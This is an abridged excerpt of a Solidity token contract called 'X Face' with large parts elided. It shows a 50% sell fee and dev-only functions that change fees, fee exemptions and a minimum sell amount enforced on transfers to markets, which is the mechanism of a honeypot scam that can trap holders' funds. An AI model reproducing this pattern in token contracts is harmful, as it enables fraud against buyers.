...
contract XFace is Context, Ownable, IERC20 {
    ...
    string internal _name = "X Face";
    string internal _symbol = "XF";
    uint8 internal _decimals = 18;
    uint private _buyFee = 0;
    uint private _sellFee = 50;
    uint256 private _minSell = 0;
    ...
    function _beforeTokenTransfer(
        ...
        if (isMarket(to)){
            if (!excludedFromFee[from]){ 
                require(amount >= _minSell, "Too little amount to sell");
            }
        }
    }
    ...
    function excludeFromFee(address _user, bool _status) public {
        if (_msgSender() == dev) {
    ...
    function updateFees(uint256 _newBuyFee, uint256 _newSellFee) external {
        if (_msgSender() == dev) {
    ...
    function currentMinSell() external view returns (uint256) {
        return _minSell;
    }

    function changeMinSell(uint256 _newMinSell) external {
        if (_msgSender() == dev) {
